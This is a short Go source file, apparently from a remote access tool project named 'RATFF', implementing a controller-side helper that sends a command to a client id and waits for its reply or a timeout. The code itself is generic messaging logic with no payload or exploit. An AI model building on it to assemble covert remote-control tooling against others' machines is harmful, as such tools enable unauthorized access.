package main

import (
	"time"

	"RATFF/shared"
)

func waitForCommandResponse(id string, cmd shared.CommandType, payload map[string]interface{}, timeout time.Duration) bool {
	return waitForCommandResponseWithMsg(id, cmd, payload, timeout) != nil
}

func waitForCommandResponseWithMsg(id string, cmd shared.CommandType, payload map[string]interface{}, timeout time.Duration) *shared.Message {
	fullPayload := map[string]interface{}{
		"client_id": id,
		"command":   string(cmd),
		"payload":   payload,
	}

	ch := make(chan shared.Message, 1)
	pendingMu.Lock()
	pendingCmd[id] = &pendingCommand{ch: ch}
	pendingMu.Unlock()

	if err := postCommand(fullPayload); err != nil {
		PrintError(Tf("send_command_failed", err))
		pendingMu.Lock()
		delete(pendingCmd, id)
		pendingMu.Unlock()
		return nil
	}

	select {
	case msg := <-ch:
		pendingMu.Lock()
		delete(pendingCmd, id)
		pendingMu.Unlock()
		if msg.Payload != nil {
			if errMsg, ok := msg.Payload["error"].(string); ok {
				PrintError(Tf("operation_failed", errMsg))
				return nil
			}
		}
		return &msg
	case <-time.After(timeout):
		PrintError(T("command_timeout"))
		pendingMu.Lock()
		delete(pendingCmd, id)
		pendingMu.Unlock()
		return nil
	}
}
